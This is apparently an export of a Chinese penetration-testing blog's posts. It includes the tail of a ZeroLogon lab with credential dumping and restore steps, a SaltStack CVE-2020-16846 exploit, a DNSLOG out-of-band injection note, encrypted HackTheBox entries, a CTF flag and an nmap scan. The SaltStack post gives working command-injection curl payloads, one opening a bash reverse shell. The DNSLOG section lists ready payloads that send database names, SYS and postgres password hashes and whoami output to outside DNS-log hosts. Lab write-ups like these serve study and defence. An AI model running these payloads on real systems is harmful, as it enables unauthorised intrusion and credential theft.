<p>此时已经打印出了很多凭证了。其中<code>DC$</code>用户的<code>nthash</code>为<code>31d6cfe0d16ae931b73c59d7e0c089c0</code>其实就是空密码，可以看到<code>DC$</code>和<code>Guest</code>用户的<code>nthash</code>是一样的。</p>
<p>接着你就可以拿着获取的凭证上去为所欲为了（。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20201024204323019.png" alt="image-20201024204323019"></p>
<h2 id="恢复hash"><a href="#恢复hash" class="headerlink" title="恢复hash"></a>恢复hash</h2><p>攻击成功后我们需要恢复域控hash，为什么要恢复呢，因为如果不恢复是会导致域控脱域。</p>
<p>恢复方法有三种：</p>
<ol>
<li>注册表导出SAM，提取原来的密码来恢复。<ol>
<li>使用zerologon里的<code>reinstall_original_pw.py</code></li>
<li>使用CVE-2020-1472里的<code>restorepassword.py</code></li>
</ol>
</li>
<li>从ntds.dict里面读取AD历史密码，然后恢复AD里面的密码<ol>
<li>只需要加 secretsdump里面加<code>-history</code>参数就行(没试过)</li>
</ol>
</li>
<li>一次性重置计算机的机器帐户密码。(包括AD，注册表，lsass里面的密码)。<ol>
<li>使用powershell 的cmdlet<code>Reset-ComputerMachinePassword</code></li>
</ol>
</li>
</ol>
<h3 id="注册表导出恢复"><a href="#注册表导出恢复" class="headerlink" title="注册表导出恢复"></a>注册表导出恢复</h3><p>使用<code>impacket</code>里的<code>smbserver.py</code>打开一个<code>smb</code>共享，（方便传文件。</p>
<p>在域控上依次执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201024211255673.png" alt="image-20201024211255673"></p>
<p>接着执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp *.save \\192.168.179.1\tmp\</span><br></pre></td></tr></table></figure>

<p>本机开始执行恢复</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py -sam &#x2F;tmp&#x2F;sam.save -system &#x2F;tmp&#x2F;system.save -security &#x2F;tmp&#x2F;security.save LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201024211651198.png" alt="image-20201024211651198"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] $MACHINE.ACC</span><br><span class="line">$MACHINE.ACC:plain_password_hex:14cf64c7410c2d8e3e86aba8987d63995667fd1b5c62fc074bfc16d38c70427d197498b670660ff9c4a721d5813ff055a9c5798da83294b736847365928098e79ad1dd7cfb3f8ff3db2221768ab0708a5aa56a0df99d890cd6a80a5001564f79e6c273dbb733b439bbb4c3b9ace469065725ddde5efa7b32b3d1785e216de12bcd68ee33f7a0471273b5479dc527da64e8e71004faaa3ae839b959250578521951997173355ae7e2b2c67d2035d178af2deb0031d5bb1c9d63496a3f02747c0c7614037946e26f145f1cf88a334c18dfc117a7fabacac7a39b4abd0f29e294d2725699d37aa805afcc401902007df19d</span><br><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:3e09c843c56dfddfa62ffa004641f712</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 reinstall_original_pw.py DC\$ 192.168.179.2 3e09c843c56dfddfa62ffa004641f712</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201024211851163.png" alt="image-20201024211851163"></p>
<p>如果此时再去执行空密码获取凭证的话就会不成功了</p>
<p><img src="https://images.atsud0.me/images/post/image-20201024212036130.png" alt="image-20201024212036130"></p>
<p><code>restorepassword.py</code>这个恢复脚本我测试恢复不行。可能是本地环境问题吧。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 restorepassword.py abc.com&#x2F;DC\$@DC -target-ip 192.168.179.2 -hexpass 14cf64c7410c2d8e3e86aba8987d63995667fd1b5c62fc074bfc16d38c70427d197498b670660ff9c4a721d5813ff055a9c5798da83294b736847365928098e79ad1dd7cfb3f8ff3db2221768ab0708a5aa56a0df99d890cd6a80a5001564f79e6c273dbb733b439bbb4c3b9ace469065725ddde5efa7b32b3d1785e216de12bcd68ee33f7a0471273b5479dc527da64e8e71004faaa3ae839b959250578521951997173355ae7e2b2c67d2035d178af2deb0031d5bb1c9d63496a3f02747c0c7614037946e26f145f1cf88a334c18dfc117a7fabacac7a39b4abd0f29e294d2725699d37aa805afcc401902007df19d </span><br><span class="line">Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] StringBinding ncacn_ip_tcp:192.168.179.2[49158]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;restorepassword.py&quot;, line 150, in &lt;module&gt;</span><br><span class="line">    action.dump(remoteName, options.target_ip)</span><br><span class="line">  File &quot;restorepassword.py&quot;, line 66, in dump</span><br><span class="line">    resp &#x3D; nrpc.hNetrServerAuthenticate3(dce, &#39;\\\\&#39; + remoteName + &#39;\x00&#39;, self.__username + &#39;$\x00&#39;, nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,remoteName + &#39;\x00&#39;,self.ppp, 0x212fffff )</span><br><span class="line">  File &quot;&#x2F;home&#x2F;kali&#x2F;.local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;impacket&#x2F;dcerpc&#x2F;v5&#x2F;nrpc.py&quot;, line 2707, in hNetrServerAuthenticate3</span><br><span class="line">    return dce.request(request)</span><br><span class="line">  File &quot;&#x2F;home&#x2F;kali&#x2F;.local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;impacket&#x2F;dcerpc&#x2F;v5&#x2F;rpcrt.py&quot;, line 878, in request</span><br><span class="line">    raise exception</span><br><span class="line">impacket.dcerpc.v5.nrpc.DCERPCSessionError: NRPC SessionError: code: 0xc000018b - STATUS_NO_TRUST_SAM_ACCOUNT - The SAM database on the Windows Server does not have a computer account for this workstation trust relationship.</span><br></pre></td></tr></table></figure>

<h3 id="读取AD历史恢复"><a href="#读取AD历史恢复" class="headerlink" title="读取AD历史恢复"></a>读取AD历史恢复</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 exphub&#x2F;windows&#x2F;CVE-2020-1472&#x2F;K8-EXP&#x2F;secretsdump.py abc.com&#x2F;DC\$@192.168.179.2  -no-pass -history</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201024220915294.png" alt="image-20201024220915294"></p>
<p>据说有一定的失败机率。。读取出来后也是使用上面两种办法其中一种恢复。</p>
<h3 id="cmdlet恢复"><a href="#cmdlet恢复" class="headerlink" title="cmdlet恢复"></a>cmdlet恢复</h3><p>这是微软在计算机脱域的情况下给出的一种解决方案。这将一次性重置计算机的机器帐户密码。(包括AD，注册表，lsass里面的密码)。</p>
<p>直接执行，即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell Reset-ComputerMachinePassword</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201024221458609.png" alt="image-20201024221458609"></p>
<p>执行之后再去执行获取凭证就不行了。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://www.anquanke.com/post/id/219374" target="_blank" rel="noopener">ZeroLogon的利用以及分析</a></li>
<li><a href="https://www.anquanke.com/post/id/219090" target="_blank" rel="noopener">ZeroLogon（CVE-2020-1472）分析与狩猎</a></li>
</ul>
]]></content>
      <categories>
        <category>靶机实验</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>CVE-2020-1472</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-16846漏洞复现</title>
    <url>/2020/11/13/CVE-2020-16846%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>SaltStack 是基于 Python  开发的一套C/S架构配置管理工具。2020年11月SaltStack官方披露了CVE-2020-16846和CVE-2020-25592两个漏洞，其中CVE-2020-25592允许任意用户调用SSH模块，CVE-2020-16846允许用户执行任意命令。组合这两个漏洞，将可以使未授权的攻击者通过Salt API执行任意命令。</p>
<a id="more"></a>

<p>EXP(无回显任意命令执行)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -k -X POST https:&#x2F;&#x2F;127.0.0.1:8000 -d &quot;token&#x3D;abc&amp;client&#x3D;ssh&amp;tgt&#x3D;*&amp;fun&#x3D;a&amp;roster&#x3D;whip1ash&amp;ssh_priv&#x3D;abc|touch%20&#x2F;tmp&#x2F;success%3b&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201113110904596.png" alt="image-20201113110904596"></p>
<p>反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -k -X POST https:&#x2F;&#x2F;10.170.0.3:8000&#x2F;run -d &quot;token&#x3D;abc&amp;client&#x3D;ssh&amp;tgt&#x3D;*&amp;fun&#x3D;a&amp;roster&#x3D;whip1ash&amp;ssh_priv&#x3D;abc|bash%20-c%20%27bash%20-i%20%3E%26%2Fdev%2Ftcp%2F172.18.0.1%2F1234%200%3E%261%27%3b</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-20201113110827117.png" alt="image-20201113110827117"></p>
<h3 id="痕迹"><a href="#痕迹" class="headerlink" title="痕迹"></a>痕迹</h3><p>执行<code>poc/exp</code>后根目录下就会多了<code>ssh_priv</code>的值的文件/文件夹</p>
<p><img src="https://images.atsud0.me/images/post/image-20201113111034675.png" alt="image-20201113111034675"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
      </categories>
      <tags>
        <tag>SaltStack</tag>
      </tags>
  </entry>
  <entry>
    <title>DNSLOG快速盲注</title>
    <url>/2020/07/22/DNSLOG%E5%BF%AB%E9%80%9F%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>有时候盲注太浪费时间了，但是我们可以将盲注变为显错注入呢?</p>
<a id="more"></a>

<h2 id="0x01-部署环境"><a href="#0x01-部署环境" class="headerlink" title="0x01 部署环境"></a>0x01 部署环境</h2><ul>
<li>Web服务器(PHPStudy+Sqli靶场)</li>
<li>随便一台服务器</li>
</ul>
<blockquote>
<p>如果是自己搭建DNSLOG的话，则多需要一台VPS，还有需要一个域名。</p>
</blockquote>
<p>使用要求</p>
<ul>
<li>能够使用load_file函数。</li>
<li>Windows服务器</li>
<li>allow_url_fopen (默认开启)</li>
</ul>
<p>secure_file_priv似乎能为NULL?在mysql 5.4.5中测试即使是NULL也使用dnslog注入。所以使用条件应该是能够利用load_file函数?</p>
<h2 id="0x02-原理说明"><a href="#0x02-原理说明" class="headerlink" title="0x02 原理说明"></a>0x02 原理说明</h2><p>UNC路径(Universal Naming Convention)通用命名规则。</p>
<blockquote>
<p>通用命名规则UNC (Universal Naming Convention) ，也叫通用命名规范、通用命名约定，指用一种通用语法来描述网络资源（如共享文件，目录或打印机）的位置。(百度解释)<br>Windows的UNC路径格式为:<code>\\servername\sharename</code>，平时也会用到这个来访问一些共享服务。linux主机不存在这个规范，所以Linux服务器无法实现这个mysql-dnslog快速盲注。</p>
</blockquote>
<p>所以Mysql的dnslog注入的原理就是:<strong>攻击者利用windows unc路径使数据库将注入语句的结果带出到dns服务器中。</strong>（个人理解）</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200719_200129.jpg" alt=""></p>
<h2 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h2><p>核心语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(concat(&#39;\\\\&#39;,hex((select database())),&#39;.pycd4.l.dnslog.io\\abv&#39;));</span><br><span class="line">&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 4,1),&#39;.XXX.ceye.io\\abc&#39;))),1,1) --+</span><br><span class="line">&#39; and load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),&#39;.XXX.ceye.io\\abc&#39;)) --+</span><br><span class="line">&#39; and load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),&#39;.XXX.dnslog.link\\abc&#39;)) --+</span><br></pre></td></tr></table></figure>

<p>这里<code>\\\\</code>四个斜杠的意思其实是<code>\\</code>。因为在mysql中不会存储有功能意义的反斜杠，所以要转义<code>\\</code>，这就是为什么会有<code>\\\\</code>的原因。</p>
<p>Windows访问<code>\\pycd4.l.dnslog.io\abc</code>(改成你自己的域名)</p>
<p>如果成功的话，dnslong中则会出现。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200719_203440.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.40.145&#x2F;sql&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select schema_name from information_schema.schemata limit 4,1),&#39;.lwy2.l.dnslog.io\\abv&#39;))),1,0) And &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>成功将数据库名字外带出来<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_193659.jpg" alt=""></p>
<p>直接查表名字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.40.145&#x2F;sql&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),&#39;.lwy2.l.dnslog.io\\abc&#39;)) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200722_194012.jpg" alt=""></p>
<h2 id="0x04-Payload"><a href="#0x04-Payload" class="headerlink" title="0x04 Payload"></a>0x04 Payload</h2><p>除了能利用在mysql注入中，我感觉能用在一切能对dns服务器进行请求，并且无回显的地方。<br>以下payload均来自<a href="https://silic.top/2019/10/26/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C/#mysql" target="_blank" rel="noopener">DNSlog注入利用手册</a></p>
<h3 id="SQLServer"><a href="#SQLServer" class="headerlink" title="SQLServer"></a>SQLServer</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE @host varchar(1024);SELECT @host&#x3D;CONVERT(varchar(1024),db_name())+&#39;.8dmer4.ceye.io&#39;;EXEC(&#39;master..xp_dirtree &quot;\\&#39;+@host+&#39;\foobar$&quot;&#39;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;;DECLARE @host varchar(1024);SELECT @host&#x3D;CONVERT(varchar(1024),db_name())+&#39;.8dmer4.ceye.io&#39;;EXEC(&#39;master..xp_dirtree &quot;\\&#39;+@host+&#39;\foobar$&quot;&#39;)--</span><br></pre></td></tr></table></figure>

<h3 id="Orcale"><a href="#Orcale" class="headerlink" title="Orcale"></a>Orcale</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS(&#39;ip.port.b182oj.ceye.io&#39;);</span><br><span class="line">SELECT UTL_HTTP.REQUEST(&#39;http:&#x2F;&#x2F;ip.port.b182oj.ceye.io&#x2F;oracle&#39;) FROM DUAL;</span><br><span class="line">SELECT HTTPURITYPE(&#39;http:&#x2F;&#x2F;ip.port.b182oj.ceye.io&#x2F;oracle&#39;).GETCLOB() FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((&#39;oracle.ip.port.b182oj.ceye.io&#39;,80) FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name&#x3D;&#39;SYS&#39;)||&#39;.ip.port.b182oj.ceye.io&#39;,80) FROM DUAL;</span><br></pre></td></tr></table></figure>

<h3 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DROP TABLE IF EXISTS table_output;</span><br><span class="line">CREATE TABLE table_output(content text);</span><br><span class="line">CREATE OR REPLACE FUNCTION temp_function()</span><br><span class="line">RETURNS VOID AS $</span><br><span class="line">DECLARE exec_cmd TEXT;</span><br><span class="line">DECLARE query_result TEXT;</span><br><span class="line">BEGIN</span><br><span class="line">SELECT INTO query_result (SELECT passwd</span><br><span class="line">FROM pg_shadow WHERE usename&#x3D;&#39;postgres&#39;);</span><br><span class="line">exec_cmd :&#x3D; E&#39;COPY table_output(content)</span><br><span class="line">FROM E\&#39;\\\\\\\\&#39;||query_result||E&#39;.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\&#39;&#39;;</span><br><span class="line">EXECUTE exec_cmd;</span><br><span class="line">END;</span><br><span class="line">$ LANGUAGE plpgsql SECURITY DEFINER;</span><br><span class="line">SELECT temp_function();</span><br></pre></td></tr></table></figure>

<h3 id="命令执行-Linux"><a href="#命令执行-Linux" class="headerlink" title="命令执行-Linux"></a>命令执行-Linux</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;ip.port.b182oj.ceye.io&#x2F;&#96;whoami&#96;</span><br><span class="line">ping -c 1 &#96;whoami&#96;.ip.port.b182oj.ceye.io</span><br></pre></td></tr></table></figure>

<h3 id="命令执行-Windows"><a href="#命令执行-Windows" class="headerlink" title="命令执行-Windows"></a>命令执行-Windows</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping %USERNAME%.b182oj.ceye.io</span><br></pre></td></tr></table></figure>

<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.b182oj.ceye.io&#x2F;xxe_test&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxxx.ceye.io&#x2F;aaa&gt;</span><br></pre></td></tr></table></figure>

<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.b182oj.ceye.io&#x2F;xxe_test&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>还有其他的payload，请去原文查看~</p>
<h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h2><ul>
<li><a href="https://www.freebuf.com/articles/web/184587.html" target="_blank" rel="noopener">使用DNSLOG拯救你的盲打盲注 </a></li>
<li><a href="https://github.com/bugscanteam/dnslog/" target="_blank" rel="noopener">DNSLog</a></li>
<li><a href="http://ceye.io" target="_blank" rel="noopener">ceye-DNSLOG</a></li>
<li><a href="https://silic.top/2019/10/26/DNSlog%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%89%8B%E5%86%8C/#mysql" target="_blank" rel="noopener">DNSlog注入利用手册</a></li>
<li><a href="https://www.freebuf.com/sectool/222967.html" target="_blank" rel="noopener">手把手带你利用SQLmap结合OOB技术实现音速盲注</a></li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>sql_injection</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Academy</title>
    <url>/2020/11/29/HackTheBox-Academy/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="活跃机器，只做记录，如果需要提示，请邮件联系。密码：root-hash" /><label>活跃机器，只做记录，如果需要提示，请邮件联系。密码：root-hash</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="d738c77f3a2d9574c48c8b27b56ce8a8f7f07f39d973e230eedfc3d2a522eb5b"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>靶机实验</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>adm组权限</tag>
        <tag>audit日志</tag>
        <tag>CVE-2018-15133</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Bucket</title>
    <url>/2020/11/25/HackTheBox-Bucket/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="活跃机器，只做记录，如果需要提示，请邮件联系。" /><label>活跃机器，只做记录，如果需要提示，请邮件联系。</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="10e3f765445f9b274cc92b477da34ad68f66bdf0669bf2178c6526f2b627d409"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>靶机实验</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Amazon-S3-Bucket</tag>
        <tag>PDF</tag>
        <tag>DynamoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Doctor</title>
    <url>/2020/11/28/HackTheBox-Doctor/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="活跃机器，只做记录，如果需要提示，请邮件联系。" /><label>活跃机器，只做记录，如果需要提示，请邮件联系。</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="6378f04d838a05def101655d83e263360f3cac53cc0c54319b5d201c4cbf948f"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>靶机实验</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>SSTI</tag>
        <tag>Splunk</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-CTF-EasyPhish</title>
    <url>/2021/01/24/HackTheBox-CTF-EasyPhish/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>Customers of secure-startup.com have been recieving some very convincing phishing emails, can you figure out why?</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig +short TXT secure-startup.com.</span><br><span class="line">&quot;v&#x3D;spf1 a mx ?all - HTB&#123;RIP_SPF_Always_2nd&quot;</span><br><span class="line"></span><br><span class="line">dig +short TXT _dmarc.secure-startup.com.</span><br><span class="line">&quot;v&#x3D;DMARC1;p&#x3D;none;_F1ddl3_2_DMARC&#125;&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：DMARC DNS TXT记录的拥有者字段必须始终为“_dmarc”，若指定该记录应用到域或子域，可以采用“_dmarc.example.com”的形式。</p>
</blockquote>
<p>在线工具：</p>
<ul>
<li><a href="https://toolbox.googleapps.com/apps/dig/" target="_blank" rel="noopener">goole-admin-toolbox-dig</a></li>
<li><a href="https://mxtoolbox.com/SuperTool.aspx" target="_blank" rel="noopener">mxtoolbox</a></li>
</ul>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>CTF</category>
        <category>OSINT</category>
      </categories>
      <tags>
        <tag>OSINT</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Netmon</title>
    <url>/2020/10/21/HackTheBox-Netmon/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li>Name : Netmon</li>
</ul>
<p><img src="https://images.atsud0.me/images/post/image-20201021183315859.png" alt="image-20201021183315859"></p>
<a id="more"></a>

<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-10-21 06:41 UTC</span><br><span class="line">Nmap scan report for 10.129.1.126</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">21&#x2F;tcp    open  ftp          Microsoft ftpd</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| 02-03-19  12:18AM                 1024 .rnd</span><br><span class="line">| 02-25-19  10:15PM       &lt;DIR&gt;          inetpub</span><br><span class="line">| 07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs</span><br><span class="line">| 02-25-19  10:56PM       &lt;DIR&gt;          Program Files</span><br><span class="line">| 02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">| 02-03-19  08:08AM       &lt;DIR&gt;          Users</span><br><span class="line">|_02-25-19  11:49PM       &lt;DIR&gt;          Windows</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">80&#x2F;tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)</span><br><span class="line">|_http-server-header: PRTG&#x2F;18.1.37.13946</span><br><span class="line">| http-title: Welcome | PRTG Network Monitor (NETMON)</span><br><span class="line">|_Requested resource was &#x2F;index.htm</span><br><span class="line">|_http-trane-info: Problem with XML parsing of &#x2F;evox&#x2F;about</span><br><span class="line">135&#x2F;tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">5985&#x2F;tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">47001&#x2F;tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49665&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49666&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49667&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49668&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49669&#x2F;tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2m42s, deviation: 0s, median: 2m42s</span><br><span class="line">|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-10-21T06:45:24</span><br><span class="line">|_  start_date: 2020-10-21T06:39:03</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 69.92 seconds</span><br></pre></td></tr></table></figure>


